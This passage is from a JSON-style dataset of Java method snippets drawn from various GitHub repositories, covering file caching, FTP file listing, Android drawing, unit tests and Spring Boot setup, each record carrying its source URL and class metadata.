file.getName();        while (prefix.length() < 3) {            // The prefix must be at least three characters long            prefix += \"_\";        }        String suffix = null; // Use the default: .tmp        File directory = file.getParentFile();        File temp = File.createTempFile(prefix, suffix, directory);        temp.deleteOnExit();        return temp;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/FileCacheRequest.java", "stars": "74", "class": {"name": "FileCacheRequest", "extends": "CacheRequest", "implements": null, "modifiers": []}}, {"method_name": "getStatus", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getStatus() {        if (mResponseCode != -1) {            int capactity = 3; // 3-digit response code            if (mResponseMessage != null) {                capactity += 1; // Space                capactity += mResponseMessage.length();            }            StringBuilder builder = new StringBuilder(capactity);            builder.append(mResponseCode);            if (mResponseMessage != null) {                builder.append(' ');                builder.append(mResponseMessage);            }            return builder.toString();        } else {            return null;        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/FileCacheRequest.java", "stars": "74", "class": {"name": "FileCacheRequest", "extends": "CacheRequest", "implements": null, "modifiers": []}}, {"method_name": "writeHeaders", "params": ["DataOutput"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void writeHeaders(DataOutput dout) throws IOException {        int headerCount = mHeaders.size();        dout.writeInt(headerCount);        for (Map.Entry<String, List<String>> entry : mHeaders.entrySet()) {            String key = entry.getKey();            List<String> values = entry.getValue();            dout.writeUTF(key);            dout.writeInt(values.size());            for (String value : values) {                dout.writeUTF(value);            }        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/FileCacheRequest.java", "stars": "74", "class": {"name": "FileCacheRequest", "extends": "CacheRequest", "implements": null, "modifiers": []}}, {"method_name": "getBody", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "OutputStream", "snippet": "    public OutputStream getBody() throws IOException {        if (mOutputStream != null) {            return mOutputStream;        }        // Create a file Output stream        File temp = createTempFile(mFile);        try {            FileOutputStream fileOutput = new FileOutputStream(temp);            FileDescriptor fd = fileOutput.getFD();            OutputStream output = fileOutput;            try {                output = new BufferedOutputStream(output, BUFFER_SIZE);                // Write the HTTP headers                DataOutputStream dout = new DataOutputStream(output);                writeHeaders(dout);                mOutputStream = new TempFileOutputStream(dout, fd, temp, mFile);                return mOutputStream;            } finally {                if (mOutputStream == null) {                    // The return-statement was not reached                    output.close();                }            }        } finally {            if (mOutputStream == null) {                // The return-statement was not reached                temp.delete();            }        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/FileCacheRequest.java", "stars": "74", "class": {"name": "FileCacheRequest", "extends": "CacheRequest", "implements": null, "modifiers": []}}, {"method_name": "abort", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void abort() {        if (mOutputStream != null) {            mOutputStream.abort();        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/FileCacheRequest.java", "stars": "74", "class": {"name": "FileCacheRequest", "extends": "CacheRequest", "implements": null, "modifiers": []}}, {"method_name": "moveTempFile", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void moveTempFile() {        \t// Don't throw exceptions because caching        \t// is not critical.        \t//        \t// TODO: Add logging            mFile.delete();            mTempFile.renameTo(mFile);        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/FileCacheRequest.java", "stars": "74", "class": {"name": "TempFileOutputStream", "extends": "FilterOutputStream", "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "close", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void close() throws IOException {            try {                flush();                fsync();                super.close();                moveTempFile();            } finally {                mTempFile.delete();            }        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/FileCacheRequest.java", "stars": "74", "class": {"name": "TempFileOutputStream", "extends": "FilterOutputStream", "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "fsync", "params": [], "throws": ["SyncFailedException"], "modifiers": ["private"], "return_type": "void", "snippet": "        private void fsync() throws SyncFailedException {            mFileDescriptor.sync();        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/FileCacheRequest.java", "stars": "74", "class": {"name": "TempFileOutputStream", "extends": "FilterOutputStream", "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "abort", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void abort() {            try {                super.close();            } catch (IOException e) {                // Ignore            } finally {              mTempFile.delete();            }        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/filecache/FileCacheRequest.java", "stars": "74", "class": {"name": "TempFileOutputStream", "extends": "FilterOutputStream", "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "setEnable", "params": ["boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setEnable(boolean enable) {        mEnable = enable;    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/util/GraceLog.java", "stars": "331", "class": {"name": "GraceLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "d", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void d(String msg) {        if (!mEnable) {            return;        }        Log.d(TAG, msg);    }", "url": "https://raw.githubusercontent.com/wurensen/GraceViewPager/master/graceviewpager/src/main/java/com/lancewu/graceviewpager/util/GraceLog.java", "stars": "331", "class": {"name": "GraceLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onDraw", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {        super.onDraw(canvas);        int bitmapWidth = bitmap.getWidth();        int bitmapHeight = bitmap.getHeight();        //degrees \u662f\u65cb\u8f6c\u89d2\u5ea6\uff0c\u5355\u4f4d\u662f\u5ea6\uff08\u4e5f\u5c31\u662f\u4e00\u5468\u6709 360\u00b0 \u7684\u90a3\u4e2a\u5355\u4f4d\uff09\uff0c\u65b9\u5411\u662f\u987a\u65f6\u9488\u4e3a\u6b63\u5411\uff1b px \u548c py \u662f\u8f74\u5fc3\u7684\u4f4d\u7f6e        canvas.save();        canvas.rotate(180, point1.x + bitmapWidth / 2, point1.y + bitmapHeight / 2);        canvas.drawBitmap(bitmap, point1.x, point1.y, paint);        canvas.restore();        canvas.save();        canvas.rotate(45, point2.x + bitmapWidth / 2, point2.y + bitmapHeight / 2);        canvas.drawBitmap(bitmap, point2.x, point2.y, paint);        canvas.restore();    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson4/Practice05RotateView.java", "stars": "2", "class": {"name": "Practice05RotateView", "extends": "View", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCmdType", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "CommandType", "snippet": "    protected CommandType getCmdType() {        return CommandType.LIST;    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/ListCmdTest.java", "stars": "6", "class": {"name": "ListCmdTest", "extends": "CommandTest", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setup", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {        testCommand = new ListCmd(SHORT_ARGUMENT);        testLibrary = new LibraryData();        List<BookEntry> bookData = new ArrayList<>();        bookData.add(new BookEntry(\"TitleA\", new String[]{\"AuthorA\"}, 3.2f, \"ISBNA\", 500));        bookData.add(new BookEntry(\"TitleB\", new String[]{\"AuthorB\"}, 4.3f, \"ISBNB\", 400));        bookData.add(new BookEntry(\"TitleC\", new String[]{\"AuthorC\"}, 1.3f, \"ISBNC\", 300));        FieldTestUtils.setPrivateField(testLibrary, testLibrary.getClass(), \"books\", bookData);    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/ListCmdTest.java", "stars": "6", "class": {"name": "ListCmdTest", "extends": "CommandTest", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "loginFtpServer", "params": ["FtpConnParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loginFtpServer(FtpConnParams ftpConnParams) {        ftpClient = new FTPClient();        try {            // \u8fde\u63a5            ftpClient.connect(ftpConnParams.getHost(), ftpConnParams.getPort());            // \u767b\u5f55            ftpClient.login(ftpConnParams.getUsername(), (String) CryptoUtils.string2Object(ftpConnParams.getPassword()));            ftpClient.setConnectTimeout(ftpConnParams.getTimeout());            ftpClient.setDataTimeout(ftpConnParams.getTimeout());            if (\"PASV\".equals(ftpConnParams.getConnectPattern())) {                ftpClient.enterRemotePassiveMode();                ftpClient.enterLocalPassiveMode();            } else if (\"PORT\".equals(ftpConnParams.getConnectPattern())) {                ftpClient.enterLocalActiveMode();                // ftpClient.enterRemoteActiveMode(host, port);            }            int reply = ftpClient.getReplyCode();            if (!FTPReply.isPositiveCompletion(reply)) {                ftpClient.disconnect();                String message = String.format(\"\u4e0eftp\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5\u5931\u8d25,\u8bf7\u68c0\u67e5\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u5426\u6b63\u786e: [%s]\",                        \"message:host =\" + ftpConnParams.getHost() + \",username = \" + ftpConnParams.getUsername() + \",port =\" + ftpConnParams.getPort());                LOG.error(message);                throw DataXException.asDataXException(FtpReaderErrorCode.FAIL_LOGIN, message);            }            //\u8bbe\u7f6e\u547d\u4ee4\u4f20\u8f93\u7f16\u7801            String fileEncoding = System.getProperty(\"file.encoding\");            ftpClient.setControlEncoding(fileEncoding);        } catch (UnknownHostException e) {            String message = String.format(\"\u8bf7\u786e\u8ba4ftp\u670d\u52a1\u5668\u5730\u5740\u662f\u5426\u6b63\u786e\uff0c\u65e0\u6cd5\u8fde\u63a5\u5230\u5730\u5740\u4e3a: [%s] \u7684ftp\u670d\u52a1\u5668\", ftpConnParams.getHost());            LOG.error(message);            throw DataXException.asDataXException(FtpReaderErrorCode.FAIL_LOGIN, message, e);        } catch (IllegalArgumentException e) {            String message = String.format(\"\u8bf7\u786e\u8ba4\u8fde\u63a5ftp\u670d\u52a1\u5668\u7aef\u53e3\u662f\u5426\u6b63\u786e\uff0c\u9519\u8bef\u7684\u7aef\u53e3: [%s] \", ftpConnParams.getPort());            LOG.error(message);            throw DataXException.asDataXException(FtpReaderErrorCode.FAIL_LOGIN, message, e);        } catch (Exception e) {            String message = String.format(\"\u4e0eftp\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5\u5931\u8d25 : [%s]\",                    \"message:host =\" + ftpConnParams.getHost() + \",username = \" + ftpConnParams.getUsername() + \",port =\" + ftpConnParams.getPort());            LOG.error(message);            throw DataXException.asDataXException(FtpReaderErrorCode.FAIL_LOGIN, message, e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-ftpreader/src/main/java/com/alibaba/datax/plugin/reader/ftpreader/StandardFtpHelper.java", "stars": "23", "class": {"name": "StandardFtpHelper", "extends": "FtpHelper", "implements": null, "modifiers": ["public"]}}, {"method_name": "logoutFtpServer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void logoutFtpServer() {        if (ftpClient.isConnected()) {            try {                //todo ftpClient.completePendingCommand();//\u6253\u5f00\u6d41\u64cd\u4f5c\u4e4b\u540e\u5fc5\u987b\uff0c\u539f\u56e0\u8fd8\u9700\u8981\u6df1\u7a76                ftpClient.logout();            } catch (IOException e) {                String message = \"\u4e0eftp\u670d\u52a1\u5668\u65ad\u5f00\u8fde\u63a5\u5931\u8d25\";                LOG.error(message);                throw DataXException.asDataXException(FtpReaderErrorCode.FAIL_DISCONNECT, message, e);            } finally {                if (ftpClient.isConnected()) {                    try {                        ftpClient.disconnect();                    } catch (IOException e) {                        String message = \"\u4e0eftp\u670d\u52a1\u5668\u65ad\u5f00\u8fde\u63a5\u5931\u8d25\";                        LOG.error(message);                    }                }            }        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-ftpreader/src/main/java/com/alibaba/datax/plugin/reader/ftpreader/StandardFtpHelper.java", "stars": "23", "class": {"name": "StandardFtpHelper", "extends": "FtpHelper", "implements": null, "modifiers": ["public"]}}, {"method_name": "isDirExist", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDirExist(String directoryPath) {        try {            return ftpClient.changeWorkingDirectory(new String(directoryPath.getBytes(), FTP.DEFAULT_CONTROL_ENCODING));        } catch (IOException e) {            String message = String.format(\"\u8fdb\u5165\u76ee\u5f55\uff1a[%s]\u65f6\u53d1\u751fI/O\u5f02\u5e38,\u8bf7\u786e\u8ba4\u4e0eftp\u670d\u52a1\u5668\u7684\u8fde\u63a5\u6b63\u5e38\", directoryPath);            LOG.error(message);            throw DataXException.asDataXException(FtpReaderErrorCode.COMMAND_FTP_IO_EXCEPTION, message, e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-ftpreader/src/main/java/com/alibaba/datax/plugin/reader/ftpreader/StandardFtpHelper.java", "stars": "23", "class": {"name": "StandardFtpHelper", "extends": "FtpHelper", "implements": null, "modifiers": ["public"]}}, {"method_name": "isFileExist", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isFileExist(String filePath) {        boolean isExitFlag = false;        try {            FTPFile[] ftpFiles = ftpClient.listFiles(new String(filePath.getBytes(), FTP.DEFAULT_CONTROL_ENCODING));            if (ftpFiles.length == 1 && ftpFiles[0].isFile()) {                isExitFlag = true;            }        } catch (IOException e) {            String message = String.format(\"\u83b7\u53d6\u6587\u4ef6\uff1a[%s] \u5c5e\u6027\u65f6\u53d1\u751fI/O\u5f02\u5e38,\u8bf7\u786e\u8ba4\u4e0eftp\u670d\u52a1\u5668\u7684\u8fde\u63a5\u6b63\u5e38\", filePath);            LOG.error(message);            throw DataXException.asDataXException(FtpReaderErrorCode.COMMAND_FTP_IO_EXCEPTION, message, e);        }        return isExitFlag;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-ftpreader/src/main/java/com/alibaba/datax/plugin/reader/ftpreader/StandardFtpHelper.java", "stars": "23", "class": {"name": "StandardFtpHelper", "extends": "FtpHelper", "implements": null, "modifiers": ["public"]}}, {"method_name": "isSymbolicLink", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSymbolicLink(String filePath) {        boolean isExitFlag = false;        try {            FTPFile[] ftpFiles = ftpClient.listFiles(new String(filePath.getBytes(), FTP.DEFAULT_CONTROL_ENCODING));            if (ftpFiles.length == 1 && ftpFiles[0].isSymbolicLink()) {                isExitFlag = true;            }        } catch (IOException e) {            String message = String.format(\"\u83b7\u53d6\u6587\u4ef6\uff1a[%s] \u5c5e\u6027\u65f6\u53d1\u751fI/O\u5f02\u5e38,\u8bf7\u786e\u8ba4\u4e0eftp\u670d\u52a1\u5668\u7684\u8fde\u63a5\u6b63\u5e38\", filePath);            LOG.error(message);            throw DataXException.asDataXException(FtpReaderErrorCode.COMMAND_FTP_IO_EXCEPTION, message, e);        }        return isExitFlag;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-ftpreader/src/main/java/com/alibaba/datax/plugin/reader/ftpreader/StandardFtpHelper.java", "stars": "23", "class": {"name": "StandardFtpHelper", "extends": "FtpHelper", "implements": null, "modifiers": ["public"]}}, {"method_name": "getListFiles", "params": ["String", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "HashSet<String>", "snippet": "    public HashSet<String> getListFiles(String directoryPath, int parentLevel, int maxTraversalLevel) {        if (parentLevel < maxTraversalLevel) {            String parentPath = null;// \u7236\u7ea7\u76ee\u5f55,\u4ee5'/'\u7ed3\u5c3e            int pathLen = directoryPath.length();            if (directoryPath.contains(\"*\") || directoryPath.contains(\"?\")) {                // path\u662f\u6b63\u5219\u8868\u8fbe\u5f0f                String subPath = UnstructuredStorageReaderUtil.getRegexPathParentPath(directoryPath);                if (isDirExist(subPath)) {                    parentPath = subPath;                } else {                    String message = String.format(\"\u4e0d\u80fd\u8fdb\u5165\u76ee\u5f55\uff1a[%s],\" + \"\u8bf7\u786e\u8ba4\u60a8\u7684\u914d\u7f6e\u9879path:[%s]\u5b58\u5728\uff0c\u4e14\u914d\u7f6e\u7684\u7528\u6237\u6709\u6743\u9650\u8fdb\u5165\", subPath,                            directoryPath);                    LOG.error(message);                    throw DataXException.asDataXException(FtpReaderErrorCode.FILE_NOT_EXISTS, message);                }            } else if (isDirExist(directoryPath)) {                // path\u662f\u76ee\u5f55                if (directoryPath.charAt(pathLen - 1) == IOUtils.DIR_SEPARATOR) {                    parentPath = directoryPath;                } else {                    parentPath = directoryPath + IOUtils.DIR_SEPARATOR;                }            } else if (isFileExist(directoryPath)) {                // path\u6307\u5411\u5177\u4f53\u6587\u4ef6                sourceFiles.add(directoryPath);                return sourceFiles;            } else if (isSymbolicLink(directoryPath)) {                //path\u662f\u94fe\u63a5\u6587\u4ef6                String message = String.format(\"\u6587\u4ef6:[%s]\u662f\u94fe\u63a5\u6587\u4ef6\uff0c\u5f53\u524d\u4e0d\u652f\u6301\u94fe\u63a5\u6587\u4ef6\u7684\u8bfb\u53d6\", directoryPath);                LOG.error(message);                throw DataXException.asDataXException(FtpReaderErrorCode.LINK_FILE, message);            } else {                String message = String.format(\"\u8bf7\u786e\u8ba4\u60a8\u7684\u914d\u7f6e\u9879path:[%s]\u5b58\u5728\uff0c\u4e14\u914d\u7f6e\u7684\u7528\u6237\u6709\u6743\u9650\u8bfb\u53d6\", directoryPath);                LOG.error(message);                throw DataXException.asDataXException(FtpReaderErrorCode.FILE_NOT_EXISTS, message);            }            try {                FTPFile[] fs = ftpClient.listFiles(new String(directoryPath.getBytes(), FTP.DEFAULT_CONTROL_ENCODING));                for (FTPFile ff : fs) {                    String strName = ff.getName();                    if(strName.startsWith(\".\")){                        //skip hidden files                        continue;                    }                    String filePath = parentPath + strName;                    if (ff.isDirectory()) {                        if (!(strName.equals(\".\") || strName.equals(\"..\"))) {                            //\u9012\u5f52\u5904\u7406                            getListFiles(filePath, parentLevel + 1, maxTraversalLevel);                        }                    } else if (ff.isFile()) {                        // \u662f\u6587\u4ef6                        sourceFiles.add(filePath);                    } else if (ff.isSymbolicLink()) {                        //\u662f\u94fe\u63a5\u6587\u4ef6                        String message = String.format(\"\u6587\u4ef6:[%s]\u662f\u94fe\u63a5\u6587\u4ef6\uff0c\u5f53\u524d\u4e0d\u652f\u6301\u94fe\u63a5\u6587\u4ef6\u7684\u8bfb\u53d6\", filePath);                        LOG.error(message);                        throw DataXException.asDataXException(FtpReaderErrorCode.LINK_FILE, message);                    } else {                        String message = String.format(\"\u8bf7\u786e\u8ba4path:[%s]\u5b58\u5728\uff0c\u4e14\u914d\u7f6e\u7684\u7528\u6237\u6709\u6743\u9650\u8bfb\u53d6\", filePath);                        LOG.error(message);                        throw DataXException.asDataXException(FtpReaderErrorCode.FILE_NOT_EXISTS, message);                    }                } // end for FTPFile            } catch (IOException e) {                String message = String.format(\"\u83b7\u53d6path\uff1a[%s] \u4e0b\u6587\u4ef6\u5217\u8868\u65f6\u53d1\u751fI/O\u5f02\u5e38,\u8bf7\u786e\u8ba4\u4e0eftp\u670d\u52a1\u5668\u7684\u8fde\u63a5\u6b63\u5e38\", directoryPath);                LOG.error(message);                throw DataXException.asDataXException(FtpReaderErrorCode.COMMAND_FTP_IO_EXCEPTION, message, e);            }            return sourceFiles;        } else {            //\u8d85\u51fa\u6700\u5927\u9012\u5f52\u5c42\u6570            String message = String.format(\"\u83b7\u53d6path\uff1a[%s] \u4e0b\u6587\u4ef6\u5217\u8868\u65f6\u8d85\u51fa\u6700\u5927\u5c42\u6570,\u8bf7\u786e\u8ba4\u8def\u5f84[%s]\u4e0b\u4e0d\u5b58\u5728\u8f6f\u8fde\u63a5\u6587\u4ef6\", directoryPath, directoryPath);            LOG.error(message);            throw DataXException.asDataXException(FtpReaderErrorCode.OUT_MAX_DIRECTORY_LEVEL, message);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-ftpreader/src/main/java/com/alibaba/datax/plugin/reader/ftpreader/StandardFtpHelper.java", "stars": "23", "class": {"name": "StandardFtpHelper", "extends": "FtpHelper", "implements": null, "modifiers": ["public"]}}, {"method_name": "getInputStream", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "InputStream", "snippet": "    public InputStream getInputStream(String filePath) {        try {            return ftpClient.retrieveFileStream(new String(filePath.getBytes(), FTP.DEFAULT_CONTROL_ENCODING));        } catch (IOException e) {            String message = String.format(\"\u8bfb\u53d6\u6587\u4ef6 : [%s] \u65f6\u51fa\u9519,\u8bf7\u786e\u8ba4\u6587\u4ef6\uff1a[%s]\u5b58\u5728\u4e14\u914d\u7f6e\u7684\u7528\u6237\u6709\u6743\u9650\u8bfb\u53d6\", filePath, filePath);            LOG.error(message);            throw DataXException.asDataXException(FtpReaderErrorCode.OPEN_FILE_ERROR, message);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-ftpreader/src/main/java/com/alibaba/datax/plugin/reader/ftpreader/StandardFtpHelper.java", "stars": "23", "class": {"name": "StandardFtpHelper", "extends": "FtpHelper", "implements": null, "modifiers": ["public"]}}, {"method_name": "getLastModifyTIme", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getLastModifyTIme(String filePath) {        try{            String timeString = ftpClient.getModificationTime(filePath);            SimpleDateFormat simpleDateFormat = new SimpleDateFormat(TIME_FORMAT_PATTERN);            return simpleDateFormat.parse(timeString).getTime();        }catch(IOException  | ParseException e){            String message = String.format(\"\u83b7\u53d6FTP\u6587\u4ef6: [%s] \u6700\u65b0\u4fee\u6539\u65f6\u95f4\u5f02\u5e38\uff0c\u8bf7\u786e\u8ba4\u662f\u5426\u652f\u6301\u8be5\u63a5\u53e3\", filePath);            LOG.error(message);            throw DataXException.asDataXException(FtpReaderErrorCode.GET_FILE_STATS_ERROR, message);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-ftpreader/src/main/java/com/alibaba/datax/plugin/reader/ftpreader/StandardFtpHelper.java", "stars": "23", "class": {"name": "StandardFtpHelper", "extends": "FtpHelper", "implements": null, "modifiers": ["public"]}}, {"method_name": "deleteFile", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteFile(String filePath) {       try{           this.ftpClient.deleteFile(filePath);       }catch(IOException e){           String message = String.format(                   \"delete file [%s] error, please check your network and file permission, message [%s]\",                   filePath, e.getMessage());           LOG.error(message);           throw DataXException.asDataXException(FtpReaderErrorCode.COMMAND_FTP_IO_EXCEPTION, message, e);       }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-ftpreader/src/main/java/com/alibaba/datax/plugin/reader/ftpreader/StandardFtpHelper.java", "stars": "23", "class": {"name": "StandardFtpHelper", "extends": "FtpHelper", "implements": null, "modifiers": ["public"]}}, {"method_name": "shopping", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void shopping() {\t\tSystem.out.println(this.name + \"\u5728\u8d2d\u7269\uff01\");\t\t//\u5f53\u4f7f\u7528s1\u53bb\u8bbf\u95ee\u5bf9\u8c61\u7684\u65f6\u5019,\u6574\u4e2a\u8fc7\u7a0b\u4e2d\u7684this\u5c31s1.\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Thisss.java", "stars": "2", "class": {"name": "Thisss", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "draw", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void draw(int mouseX, int mouseY, float partialTicks) {    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/FriendsPanel.java", "stars": "12", "class": {"name": "FriendsPanel", "extends": "Panel", "implements": null, "modifiers": ["public"]}}, {"method_name": "testParseArgumentsIllegalArgument", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testParseArgumentsIllegalArgument() {        CommandTestUtils.checkArgumentInput(testCommand, false, \"nonsense\");    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/ListCmdBasicTest.java", "stars": "6", "class": {"name": "ListCmdBasicTest", "extends": "ListCmdTest", "implements": null, "modifiers": ["public"]}}, {"method_name": "testParseArgumentsLegalArgument", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testParseArgumentsLegalArgument() {        CommandTestUtils.checkArgumentInput(testCommand, true, SHORT_ARGUMENT);        CommandTestUtils.checkArgumentInput(testCommand, true, LONG_ARGUMENT);        CommandTestUtils.checkArgumentInput(testCommand, true, BLANK_ARGUMENT);    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/ListCmdBasicTest.java", "stars": "6", "class": {"name": "ListCmdBasicTest", "extends": "ListCmdTest", "implements": null, "modifiers": ["public"]}}, {"method_name": "testExecuteShortList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testExecuteShortList() {        String expectedConsoleOutput = \"3 books in library:\\nTitleA\\nTitleB\\nTitleC\";        CommandTestUtils.checkExecuteConsoleOutput(testCommand, testLibrary, expectedConsoleOutput);    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/ListCmdBasicTest.java", "stars": "6", "class": {"name": "ListCmdBasicTest", "extends": "ListCmdTest", "implements": null, "modifiers": ["public"]}}, {"method_name": "testExecuteLongList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testExecuteLongList() {        testCommand = new ListCmd(LONG_ARGUMENT);        String expectedConsoleOutput =        \"3 books in library:\\n\" +        \"TitleA\\n\" +        \"by AuthorA\\n\" +        \"Rating: 3.20\\n\" +        \"ISBN: ISBNA\\n\" +        \"500 pages\\n\\n\" +        \"TitleB\\n\" +        \"by AuthorB\\n\" +        \"Rating: 4.30\\n\" +        \"ISBN: ISBNB\\n\" +        \"400 pages\\n\\n\" +        \"TitleC\\n\" +        \"by AuthorC\\n\" +        \"Rating: 1.30\\n\" +        \"ISBN: ISBNC\\n\" +        \"300 pages\";        CommandTestUtils.checkExecuteConsoleOutput(testCommand, testLibrary, expectedConsoleOutput);    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/ListCmdBasicTest.java", "stars": "6", "class": {"name": "ListCmdBasicTest", "extends": "ListCmdTest", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        // \u9ed8\u8ba4SpringApplication\u542f\u52a8//        SpringApplication.run(ApplicationConfiguration.class, args);        // \u901a\u8fc7SpringApplication API\u81ea\u5b9a\u4e49SpringApplication\u7684\u542f\u52a8\u53c2\u6570        Set<String> sources = new HashSet<>();        sources.add(ApplicationConfiguration.class.getName());        SpringApplication springApplication = new SpringApplication();        springApplication.setSources(sources);        // \u5173\u95ed\u9ed8\u8ba4Web\u914d\u7f6e        springApplication.setWebApplicationType(WebApplicationType.NONE);        springApplication.setAdditionalProfiles(\"dev\");        springApplication.setBannerMode(Banner.Mode.OFF);        springApplication.setHeadless(true);        springApplication.run(args);        // \u901a\u8fc7SpringApplicationBuilder API\u81ea\u5b9a\u4e49SpringApplication\u7684\u542f\u52a8\u53c2\u6570//        new SpringApplicationBuilder(ApplicationConfiguration.class)//                .bannerMode(Banner.Mode.OFF)//                .web(WebApplicationType.NONE)//                .profiles(\"dev\")//                .headless(true)//                .run(args);    }", "url": "https://raw.githubusercontent.com/mqxu/spring-boot-review/master/spring-boot-application/src/main/java/com/soft1851/springboot/bootstrap/SpringApplicationBootstrap.java", "stars": "3", "class": {"name": "SpringApplicationBootstrap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "doFilter", "params": ["ServletRequest", "ServletResponse", "FilterChain"], "throws": ["IOException", "ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)\t\t\tthrows IOException, ServletException {\t\tHttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;\t\tUserContextHolder.getContext().setCorrelationId(httpServletRequest.getHeader(UserContext.CORRELATION_ID));\t\tUserContextHolder.getContext().setUserId(httpServletRequest.getHeader(UserContext.USER_ID));\t\tUserContextHolder.getContext().setAuthToken(httpServletRequest.getHeader(UserContext.AUTH_TOKEN));\t\tlogger.debug(\"UserContextFilter Correlation id: {}\", UserContextHolder.getContext().getCorrelationId());\t\tfilterChain.doFilter(httpServletRequest, servletResponse);\t}", "url": 